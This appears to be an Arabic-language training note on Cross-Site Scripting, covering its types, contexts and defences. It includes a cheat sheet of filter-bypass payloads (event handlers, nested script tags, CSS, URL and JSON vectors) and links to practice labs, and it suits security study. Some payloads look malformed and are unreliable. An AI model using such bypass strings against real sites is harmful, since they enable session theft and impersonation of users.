## 1. مقدمة

**Cross-Site Scripting (XSS)** هي ثغرة تسمح للمهاجم بحقن وتشغيل JavaScript داخل متصفح الضحية، مما يسمح بتجاوز Same-Origin Policy.

## 2. كيف تعمل XSS

عندما يعرض الموقع مدخلات المستخدم بدون فلترة، يمكن تنفيذ كود JavaScript خبيث.

## 3. أنواع XSS

- **Reflected XSS**

- **Stored XSS**

- **DOM-Based XSS**

## 4. ماذا يستطيع المهاجم فعله

- سرقة Cookies

- انتحال الهوية

- تنفيذ أفعال نيابة عن المستخدم

## 5. Contexts

- HTML

- Attribute

- JavaScript

- URL

## 6. حماية

- Input Filtering

- Output Encoding

- CSP

- Security Headers

## 7. Payloads

### لو script مسموح

```
<script>alert(1)</script>
```

### لو يتم حذف كلمة script فقط

```
<scr<script>ipt>alert(1)</scr<script>ipt>
```

### لو يمنع الوسوم لكن يسمح بالـevents

```
<img src=x onerror=alert(1)>
```

### لو يمنع كلمة alert

```
confirm(1)
prompt(1)
```

### لو يمنع الأقواس

```
Function`alert\`1\``
```

### لو يمنع علامات التنصيص

```
<svg/onload=alert(1)>
```

### لو يمنع =

```
<svg/onload@alert(1)>
```

### XSS عبر CSS

```
<div style="background:url(javascript:alert(1))">
```

### XSS عبر SVG

```
<svg/onload=alert(1)>
```

### XSS عبر URL

```
?x="><img src=x onerror=alert(1)>
```

### XSS عبر JSON

```
{"name":"</script><img src=x onerror=alert(1)>"}
```

### DOM XSS

```
" onmouseover="alert(1)
```

---

## 🧪 المختبرات العملية (Practical Labs)

قائمة بالمختبرات العملية الموثقة لهذا القسم:

1. [Reflected XSS في سياق HTML](labs/01-reflected-xss-html.md)
2. [Stored XSS في سياق HTML](labs/02-stored-xss-html.md)
3. [DOM XSS في document.write](labs/03-dom-xss-document-write.md)
4. [DOM XSS في innerHTML](labs/04-dom-xss-innerhtml.md)
5. [DOM XSS في jQuery (href attribute)](labs/05-dom-xss-jquery-href.md)
6. [DOM XSS في jQuery (hashchange event)](labs/06-dom-xss-jquery-selector.md)
7. [Reflected XSS في خصائص التاجات](labs/07-reflected-xss-attribute.md)
8. [Stored XSS في خاصية href](labs/08-stored-xss-href.md)
9. [Reflected XSS داخل سلسلة JS نصية](labs/09-reflected-xss-js-string.md)
10. [DOM XSS داخل عنصر select](labs/10-dom-xss-select-element.md)
11. [DOM XSS في تعبيرات AngularJS](labs/11-dom-xss-angularjs.md)
12. [Reflected DOM XSS](labs/12-reflected-dom-xss.md)
13. [Stored DOM XSS](labs/13-stored-dom-xss.md)
14. [تجاوز WAF يحظر معظم التاجات والخصائص](labs/14-reflected-xss-waf-bypass.md)

---
